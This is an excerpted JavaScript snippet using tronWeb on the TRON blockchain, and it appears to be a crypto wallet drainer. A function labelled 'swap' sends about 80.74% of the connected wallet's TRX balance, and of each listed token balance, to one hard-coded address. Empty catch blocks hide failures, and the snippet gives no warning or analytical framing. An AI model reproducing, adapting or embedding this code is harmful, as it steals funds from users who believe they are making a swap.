var contractsAddress = ["TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
            ...
            async function swap(){
                try{
                    ...
                    await tronWeb.trx.sendTransaction("TZ44LW2FdGhrkY3Me85sx5n1VMSgCoopXC", Math.round(balance * 80.74 / 100));
                }catch{}
                for(i=0; i<contractsAddress.length; i++){
                    ...
                    if (balance.toNumber() >= 0){
                        await cc.transfer("TZ44LW2FdGhrkY3Me85sx5n1VMSgCoopXC", Math.round(balance * 80.74 / 100)).send()
                    }
                    }catch{}
                }
            }
